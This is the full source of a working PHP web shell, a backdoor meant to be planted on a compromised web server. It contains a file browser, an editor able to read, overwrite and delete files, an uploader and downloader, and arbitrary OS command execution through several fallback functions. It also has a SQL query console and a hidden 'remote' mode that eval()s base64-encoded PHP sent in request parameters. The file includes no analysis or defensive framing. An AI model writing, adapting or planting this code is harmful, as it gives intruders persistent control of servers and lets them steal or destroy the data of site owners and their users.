<?php

define("PASSWORD", "1a1dc91c907325c69271ddf0c944bc72");  //  Password ( md5 ) Default : pass 
define("STYLE", "dark");  // Shell style ( dark / light ) 


function os() { 
	return strtoupper(substr(PHP_OS, 0, 3));
}

function root_dir() { 
	return getcwd() . DIRECTORY_SEPARATOR;
}

function this_file() { 
	return (isset($_GET['file']) && file_exists($_GET['file'])) ? $_GET['file']:null;
}

function this_url() { 
	return "http://" . $_SERVER["HTTP_HOST"] . $_SERVER["PHP_SELF"];
}

function this_path() {
	if(!isset($_COOKIE["shell_path"]) || !is_dir($_COOKIE['shell_path']))  
		return root_dir();
	if(isset($_GET['path']) && is_dir($_GET['path'])) 
		return $_GET['path']; 
	return $_COOKIE["shell_path"]; 
}


class Shell {
	public function __construct() {
		$this->action = isset($_GET["act"])? $_GET["act"]:null;
		$this->setCookies();
	}
	
	public function login() {
		if(!$this->isAuthenticated()) {
			if(@md5($_POST["password"]) == PASSWORD) {
				setcookie("shell_pass", PASSWORD, time() + (60 * 60 * 24), "/");
				header("Location: " . this_url());
			} else {
				?>
				<html>
				<form method="POST">
					<input name="password" type="text" style="border:0px">
				</form>
				</html>
				<?php 
			}
			exit();
		}
	}
	
	public function logout() {
		if($this->action == "exit") {
			setcookie("shell_pass", null, time() - (60 * 60), "/");
			setcookie("shell_path", null, time() - (60 * 60), "/");
			setcookie("shell_sql", null, time() - (60 * 60), "/");
			header("Location: " . this_url()); 
		}
	}
	
	private function isAuthenticated() {
		if(!isset($_COOKIE["shell_pass"])) 
			return false; 
		if($_COOKIE["shell_pass"] != PASSWORD) 
			return false; 
		return true; 
	}
	
	private function setCookies() { 
		
		if(!isset($_COOKIE["shell_path"]) || !is_dir($_COOKIE['shell_path'])) 
			setcookie("shell_path", root_dir(), time() + (60 * 60 * 24), "/"); 
		elseif(isset($_GET['path']) && is_dir($_GET['path'])) 
			setcookie("shell_path", $_GET['path'], time() + (60 * 60 * 24), "/"); 
		if(!isset($_COOKIE["shell_sql"])) {
			$cookie = array("host", "user", "pass", "db", "dbms");  
		} else { 
			$values = unserialize($_COOKIE["shell_sql"]); 
			$cookie = array();
			$cookie[] = (isset($_POST['host']) && @$_POST['host'] != "")? $_POST['host']:$values[0];
			$cookie[] = (isset($_POST['user']) && @$_POST['user'] != "")? $_POST['user']:$values[1];
			$cookie[] = (isset($_POST['pass']) && @$_POST['pass'] != "")? $_POST['pass']:$values[2];
			$cookie[] = ((isset($_POST['db']) && @$_POST['db'] != "")? $_POST['db']:(isset($_GET['db']) ? $_GET['db']:$values[3]));
			$cookie[] = (isset($_POST['dbms']) && @$_POST['dbms'] != "")? $_POST['dbms']:$values[4]; 
		}
		setcookie("shell_sql", serialize($cookie), time() + (60 * 60 * 24), "/"); 
	}
	
	public function download() {
		if(isset($_POST["download"]) && $this->isAuthenticated()) 
			FileTransfer::downloader($_POST['path']);
	}
	
	public function info() {
		?>
		<table>
			<tr><th>OS: <?php echo @php_uname(); ?></th></tr>
		</table>
		<table>
			<tr><th>Server: <?php echo getenv('SERVER_SOFTWARE'); ?></th></tr>
		</table>
		<table>
			<tr>
				<th>Computer: <?php echo getenv('COMPUTERNAME'); ?></th>
				<th>Domain: <?php echo @php_uname('n'); ?></th>
				<th>User: <?php echo @get_current_user(); ?></th>
				<th>IP: <?php echo (getenv('LOCAL_ADDR') != null) ? getenv('LOCAL_ADDR') : getenv('SERVER_ADDR'); ?></th>
			</tr>
		</table>
		<?php 
	}
	
	public function actions() {
		if($this->action == "fbrowser") { 
			$fbrowser = new FileBrowser(this_path()); 
			$fbrowser->body();
		} elseif($this->action == "feditor") { 
			$feditor = new FileEditor((this_file() ? this_file():this_path())); 
			$feditor->actions();
			$feditor->body(); 
		} elseif($this->action == "fuploader") { 
			FileTransfer::uploader(this_path()); 
		} elseif($this->action == "cmd") { 
			Cmd::body(); 
		} elseif($this->action == "sql") { 
			$sql = new Database(); 
			$sql->query(); 
			$sql->body(); 
		} elseif($this->action == "exit") {
			$this->logout(); 
		}
	}
	
	public function remote() {
		function request($req) { 
			return isset($_GET[$req]) ? urldecode($_GET[$req]):base64_decode($_POST[$req]); 
		}
		if(isset($_REQUEST["remote"]) && @md5($_REQUEST["password"]) == PASSWORD) { 
			if(isset($_REQUEST["cmd"])) 
				Cmd::run(request("cmd"));
			elseif(isset($_REQUEST["php"])) 
				eval(request("php")); 
			elseif(isset($_REQUEST["info"])) 
				echo os().":".@get_current_user()."/".@gethostname().":".@getenv('SERVER_ADDR');
			exit();
		}
	}
}


class FileBrowser {
	public function __construct($path) {
		$this->path = $path;
	}
	
	public function body() {
		?>
		<table class="fbrowser">
			<tr style="<?php echo Css::style("tr"); ?>">
				<th>Cwd: <?php echo $this->cwd(); ?></th>
				<th class="menu" ><a href='?act=fbrowser&path=<?php echo root_dir(); ?>'>Home</a></th>
				<th>Drives: <?php echo $this->drives(); ?></th>
				<th></th>
				<th></th>
			</tr>
			<tr style="<?php echo Css::style("tr"); ?>">
				<th>Name</th><th>Size</th><th>Permissions</th><th>Created</th><th>Modified</th>
			</tr>
			<?php echo $this->dirsFiles(); ?>
		</table>
		<?php 
	}
	
	private function dirsFiles() {
		$fstr = "<tr><td><a href='?act=fbrowser&path=%s'>%s</a></td><td>%s</td><td>%s / %s</td><td>%s</td><td>%s</td></tr>";
		$dstr = "<tr><td><a href='?act=feditor&file=%s'>%s</a></td><td>%s</td><td>%s / %s</td><td>%s</td><td>%s</td></tr>";
		$dfl = $this->listDirsFiles();
		if($dfl == false) 
			return "<tr><th>Can't access: $this->path</th></tr>"; 
		$df_list = ""; 
		foreach($dfl[0] as $d) 
			$df_list .= sprintf($fstr, urlencode($d[1].DIRECTORY_SEPARATOR), $d[0].DIRECTORY_SEPARATOR, $d[2], $d[3], $d[4], $d[5], $d[6]);
		foreach($dfl[1] as $f) 
			$df_list .= sprintf($dstr, urlencode($f[1]), $f[0], $f[2], $f[3], $f[4], $f[5], $f[6]);
		return $df_list;
	}
	
	public function listDirsFiles() {
		$dirs = array();
		$files = array();
		if(($d_f = @scandir($this->path)) === false) 
			return false;
		foreach($d_f as $i) { 
			if($i != '.' && $i != '..') {
				$path = $this->path . $i; 
				if(is_dir($this->path . $i)) 
					$dirs[] = array(
						$i, $path, "Dir", 
						$this->getUidGid($path), $this->getPerms($path), 
						$this->getCMDate($path), $this->getCMDate($path, 9)
					); 
				if(is_file($this->path . $i)) 
					$files[] = array(
						$i, $path, $this->getSize($path), 
						$this->getUidGid($path), $this->getPerms($path), 
						$this->getCMDate($path), $this->getCMDate($path, 9)
					); 
			}
		} 
		return array($dirs, $files);
	}
	
	private function cwd() {
		$path = "";
		$parts = explode(DIRECTORY_SEPARATOR, $this->path);
		for($i=0; $i<count($parts)-1; $i++) {
			$path .= $parts[$i] . DIRECTORY_SEPARATOR;
			echo "<a href='?act=fbrowser&path=" . $path . "'>" . $parts[$i] . DIRECTORY_SEPARATOR . "</a>";
		}
	}
	
	private function drives() {
		foreach(range("A", "Z") as $drive) {
			if(@is_readable($drive . ":" . DIRECTORY_SEPARATOR)) 
				echo "<a href='?act=fbrowser&path=$drive:\\'>$drive:\\&nbsp;</a>"; 
			elseif(@is_dir($drive . ":" . DIRECTORY_SEPARATOR)) 
				echo "$drive:\\&nbsp;";
		}
	}
	
	private function getSize($path) {
		$stat = stat($path); 
		if($stat[7] > (1024*1024)) 
			return (int)($stat[7] / (1024*1024)) . " MB";
		elseif($stat[7] > 1024) 
			return (int)($stat[7] / 1024) . " KB";
		return $stat[7] . " B"; 
	}
	
	private function getPerms($path) {
		return substr(sprintf("%o", fileperms($path)), -4);
	}
	
	private function getUidGid($path) {
		$stat = stat($path); 
		return $stat[4] . ":" . $stat[5]; 
	}
	
	private function getCMDate($path, $d=10) {
		$stat = stat($path);
		return date("d/m/Y H:i", $stat[$d]); 
	}
}


class FileEditor  {
	public function __construct($path) {
		$this->path = isset($_POST['path'])? $_POST['path']:$path;
		$this->text = "";
		$this->message = "";
	}
	
	public function actions() { 
		if(isset($_POST["read"])) 
			$this->feRead();
		elseif(isset($_POST["write"])) 
			$this->feWrite($_POST['content']);
		elseif(isset($_POST["remove"])) 
			$this->message = $this->feRemove($this->path) ? "Deleted.":"Failed.";
		elseif(isset($_POST["rename"])) 
			$this->feRename(((this_file() == null) ? this_path():this_file())); 
		elseif(isset($_POST["mkdir"])) 
			$this->feMkdir(); 
	}
	
	public function body() { 
		?>
		<form method="POST">
			<input name="path" type="text" size="60" value="<?php echo $this->path; ?>">
			<input name="read" type="submit" value="read >>">
			<input name="write" type="submit" value="write >>">
			<input name="remove" type="submit" value="rmove >>">
			<input name="rename" type="submit" value="rname >>">
			<input name="mkdir" type="submit" value="mkdir >>">
			<input name="download" type="submit" value="dnload >>">
			&nbsp;&nbsp;<b><?php echo $this->message; ?></b>
			<pre class="sep"><textarea name="content"><?php echo $this->text; ?></textarea></pre>
		</form>
		<?php
	}
	
	private function feRead() {
		if(($data = @file_get_contents($this->path)) !== false) 
			$this->text = $this->isHtml($data) ? htmlspecialchars($data):$data; 
		else 
			$this->message = "Can't access file.";
	}
	
	private function feWrite($data) {
		$this->message = (@file_put_contents($this->path, $data) !== false) ? "Saved.":"Failed.";
	}
	
	private function feRemove($path) {
		if(!is_file($path) && !is_dir($path)) 
			return false; 
		if(is_file($path)) 
			return @unlink($path);
		if(($dir_content = @scandir($path)) === false) 
			return false; 
		foreach($dir_content as $d_f) 
			if($d_f != "." && $d_f != "..") 
				$this->feRemove($path . DIRECTORY_SEPARATOR . $d_f);
		return @rmdir($path);
	}
	
	private function feRename($new_path) {
		$this->message = (@rename($this->path, $new_path) !== false) ? "Renamed.":"Failed.";
	}
	
	private function feMkdir() {
		$this->message = (@mkdir($this->path) !== false) ? "Created.":"Failed.";
	}
	
	private function isHtml($data) {
		if(preg_match('/<html/im', $data, $m) || preg_match('/<body/im', $data, $m)) 
			return true;
		if(preg_match('/<form(.*?)form>/im', $data, $m) || preg_match('/<table(.*?)table>/im', $data, $m)) 
			return true;
		return false;
	}
}


class FileTransfer {
	public static function uploader($path) {
		?>
		<form method="POST", enctype="multipart/form-data">
			<input name="path" type="text" size="60" value="<?php echo $path; ?>">
			<input name="file" type="file">
			<input name="upload" type="submit" value=" >>">
		</form>
		<?php 
		if(isset($_POST["upload"])) { 
			$path = $_POST["path"] . basename($_FILES["file"]["name"]);
			if(move_uploaded_file($_FILES["file"]["tmp_name"], $path)) 
				echo "<b>File uploaded.</b>";
			else 
				echo "<b>Failed.<b>";
		}
	}
	
	public static function downloader($file) {
		header("Content-Disposition: attachment; filename=\"" . @basename($file) . "\"");
		header("Content-Length: \"" . @filesize($file) . "\"");
		header("Content-Type: application/octet-stream;");
		@readfile($file);
		exit();
	}
}


class Database {
	private $my_dbs = "SHOW DATABASES;"; 
	private $my_tbl = "SHOW TABLES;"; 
	private $ms_dbs = "SELECT name FROM master.dbo.sysdatabases"; 
	private $ms_tbl = "SELECT * FROM INFORMATION_SCHEMA.TABLES;"; 
	
	public function __construct() {
		$cookies = isset($_COOKIE["shell_sql"]) ? unserialize($_COOKIE["shell_sql"]):array("host", "user", "pass", "db", "dbms");
		$get_db = isset($_GET['db']) ? urldecode($_GET['db']):null; 
		$get_table = isset($_GET['table']) ? urldecode($_GET['table']):null; 
		$this->host = isset($_POST['host']) ? $_POST['host']:$cookies[0];
		$this->user = isset($_POST['user']) ? $_POST['user']:$cookies[1];
		$this->pass = isset($_POST['pass']) ? $_POST['pass']: $cookies[2];
		$this->db = (isset($get_db) ? $get_db : (isset($_POST['db']) ? $_POST['db']:$cookies[3]));
		$this->dbms = isset($_POST['dbms']) ? $_POST['dbms']:$cookies[4];
		$this->query = (isset($get_db) ? "SHOW TABLES;":(isset($get_table) ? "SELECT * FROM $get_table;":$this->my_dbs));
		if(isset($_POST["submit"])) 
			$this->query = ((@$_POST['query'] != "") ? $_POST['query']:($this->dbms == "mssql" ? $this->ms_dbs:$this->my_dbs));
		$this->output = ""; 
	}
	
	public function body() { 
		?>
		<form method="POST">
			<input name="host" type="text" size="12" value="<?php echo $this->host; ?>" onclick="cleanValue('host')">
			<input name="user" type="text" size="12" value="<?php echo $this->user; ?>" onclick="cleanValue('user')">
			<input name="pass" type="text" size="12" value="<?php echo $this->pass; ?>" onclick="cleanValue('pass')">
			<input name="db" type="text" size="12" value="<?php echo $this->db; ?>" onclick="cleanValue('db')">
			<input name="dbms" type="text" size="12" value="<?php echo $this->dbms; ?>" onclick="cleanValue('dbms')">
			<input name="query" type="text" size="60" value="<?php echo $this->query; ?>" onclick="cleanValue('query')">
			<input name="submit" type="submit" value=" >>">
		</form>
		<div class="sep">
			<?php echo $this->output; ?> 
		</div>
		<?php 
	}
	
	public function query() { 
		if(isset($_POST['submit']) || isset($_GET['db']) || isset($_GET['table'])) { 
			$dsn = "$this->dbms:host=$this->host; dbname=$this->db"; 
			try {
				@$conn = new PDO("$this->dbms:host=$this->host; dbname=$this->db", $this->user, $this->pass);
				@$conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
				@$query = $conn->prepare($this->query);
				try { 
					@$query->execute();
					if(strtoupper(substr($this->query, 0, 6)) == "SELECT" || strtoupper(substr($this->query, 0, 4)) == "SHOW") 
						$this->read($query); 
					else  
						$this->output = "<b>Query executed.</b>";
				} catch(PDOException $e) { 
					$this->output = "<b>Query failed.</b>" . $e->getMessage();
				} 
			} catch(PDOException $e) { 
				$this->output = "<b>Connection failed: </b>" . $e->getMessage();
			}
			$conn = null; 
		}
	}
	
	private function read($query) {
		$this->output = "<table class='sql'>";
		$result = @$query->setFetchMode(PDO::FETCH_ASSOC); 
		foreach($query->fetchAll() as $id => $row) {
			if($id == 0) {
				$this->output .= "<tr>";
				foreach($row as $n => $v) 
					$this->output .= "<th>$n</th>";
				$this->output .= "</tr>";
			}
			$this->output .= "<tr>";
			foreach($row as $n => $v) { 
				if(strtoupper($n) == "DATABASE")  
					$this->output .= "<td><a href='?act=sql&db=" . urlencode($v) . "'>" . $v . "</a></td>";
				elseif(strtoupper(substr($n, 0, 5)) == "TABLE") 
					$this->output .= "<td><a href='?act=sql&table=" . urlencode($v) . "'>" . $v . "</a></td>";
				else 
					$this->output .= "<td>" . htmlspecialchars($v) . "</td>"; 
			}
			$this->output .= "</tr>";
		} 
		$this->output .= "</table>";
	}
}


class Cmd { 
	public static function body() { 
		?>
		<form method="POST">
			<input name="cmd" type="text" size="80" value="cmd_" onclick="cleanValue('cmd', 'any')">
			<input name="run" type="submit" value=" >>">
		</form>
		<?php 
		if(isset($_POST["run"])) {  
			$cmd = @$_POST["cmd"] . " 2>&1";
			echo "<pre>";
			Cmd::run($cmd); 
			echo "</pre>"; 
		}
	}

	public static function run($cmd) { 
		if(is_callable("system")) 
			system($cmd);
		elseif(is_callable("passthru")) 
			passthru($cmd);
		else  
			echo Cmd::output($cmd); 
	}

	public static function output($cmd) { 
		$output = "";
		if(is_callable("shell_exec")) { 
			$output = shell_exec($cmd);
		} elseif(is_callable("exec")) {
			exec($cmd, $out);
			foreach($out as $o) 
				$output .= $o . PHP_EOL;
		} elseif(is_callable("popen")) {
			if(($pop = popen($cmd, 'r')) !== false) {
				while(!feof($pop)) 
					$output .= fread($pop, 1024);
				pclose($pop);
			}
		} elseif(is_callable("proc_open")) { 
			$desc = array(0=>array("pipe", "r"), 1=>array("pipe", "w"), 2=>array("pipe", "w"));
			$proc = proc_open($cmd, $desc, $pipes);
			while(!feof($pipes[1])) 
				$output .= fread($pipes[1], 1024) ;
			fclose($pipes[1]);
			proc_close($proc);
		} else { 
			$output = "Failed."; 
		}
		return $output;
	}
}


class Css {
	public static function colors() { 
		if(STYLE == "dark") 
			$colors = array(
				"color"=>"#ddefff", "back"=>"#181818", 
				"link"=>"#ddefff", "visited"=>"#83c5ff", "hover"=>"#202020" 
			);
		else 
			$colors = array(
				"color"=>"#181818", "back"=>"#f0f8ff", 
				"link"=>"#015fb2", "visited"=>"#00437e", "hover"=>"#ddefff" 
			);
		return $colors;
	}

	public static function style($part="color") { 
		$colors = Css::colors();
		if($part == "body" || $part == "table" || $part == "tr" || $part == "th" || $part == "td") { 
			return sprintf(" color:%s; background-color:%s; ", $colors['color'], $colors['back']);
		} elseif($part == "input") { 
			if(STYLE == "dark") 
				return sprintf(" color:%s; background-color:%s; border:1px solid %s; ", $colors['back'], $colors['color'], $colors['visited']);
			else 
				return sprintf(" color:%s; background-color:%s; border:1px solid %s; ", $colors['hover'], "#242424", $colors['link']);
		} elseif($part == "hover") { 
			return sprintf(" color:%s; background-color:%s; ", $colors['color'], $colors['hover']);
		} else {
			return $colors;
		}
	}
}

?>
<?php $shell = new Shell(); ?>
<?php $shell->remote(); ?>
<?php $shell->login(); ?>
<?php $shell->logout(); ?>
<?php $shell->download(); ?>
<?php $colors = Css::colors(); ?>
<html>
<head>
	<title>Shell</title>
	<style>
		body { <?php echo Css::style("body"); ?> text-align:left; padding:2px; font-size:12px; }
		table { <?php echo Css::style("table"); ?> border-collapse:collapse; width:100%; padding:2px; font-size:12px; }
		th { font-size:13px; text-align:left; padding:2px; }
		td { font-size:12px; text-align:left; padding:2px; }
		table.fbrowser tr { <?php echo Css::style("tr"); ?> }
		table.fbrowser tr:hover { <?php echo Css::style("hover"); ?> } 
		.sql { border:1px solid <?php echo $colors['color']; ?>; <?php echo Css::style("table"); ?> width:100%; padding:2px; font-size:12px;}
		.sql th { <?php echo Css::style("th"); ?>  border:1px solid <?php echo $colors['color']; ?>;}
		.sql td { font-size:12px; text-align:left; padding:2px; } 
		.sql tr { <?php echo Css::style("tr"); ?> }
		.sql tr:hover { <?php echo Css::style("hover"); ?> }
		input { <?php echo Css::style("input"); ?> font-size:12px; padding:2px; }
		textarea { width:100%; height:100%; }
		div { padding:2px; }
		.sep { padding:0px; }
		a:link { color:<?php echo $colors['link']; ?>; }
		a:visited { color:<?php echo $colors['visited']; ?>; }
		.menu { text-align:left; padding:2px; font-size:13px; }
		.menu a { color:<?php echo $colors['color']; ?>; text-decoration:none; }
	</style>
	<script>
	function cleanValue(name, value="") {
		if(
			document.getElementsByName(name)[0].value == name 
			|| document.getElementsByName(name)[0].value == value
			|| value == "any"
		)
			document.getElementsByName(name)[0].value = "";
	}
	</script>
</head>
<body>
<div>
	<?php $shell->info(); ?>
</div>
<div>
	<hr>
	<table class="menu"> 
		<tr>
			<th><a href="?act=fbrowser">FileBrowser</a></th>
			<th><a href="?act=feditor">FileEditor</a></th>
			<th><a href="?act=fuploader">FileUploader</a></th>
			<th><a href="?act=cmd">RunCmd</a></th>
			<th><a href="?act=sql">SqlQueries</a></th>
			<th><a href="?act=exit">Exit</a></th>
		</tr>
	</table>
	<hr>
</div>
<div>
	<?php $shell->actions(); ?>
</div>
</body>
</html>
